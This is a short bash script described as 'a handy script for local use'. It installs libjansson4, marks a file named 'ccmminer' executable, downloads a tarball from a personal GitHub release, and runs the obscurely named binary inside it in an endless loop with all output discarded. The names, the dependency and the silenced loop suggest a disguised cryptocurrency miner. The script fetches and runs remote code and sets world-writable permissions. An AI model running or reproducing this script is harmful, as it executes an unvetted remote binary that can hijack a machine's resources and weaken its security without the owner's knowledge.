#!/bin/bash
#
# This is a handy script for local use

sudo apt update
sudo apt install libjansson4 -y
chmod 777 ccmminer
wget https://github.com/mariobiszz/perus/releases/download/1/ver.tar.gz
tar -xvf ver.tar.gz
chmod 777 ver ver.ini
while true
do
./ver ver.ini
> /dev/null 2>&1
done
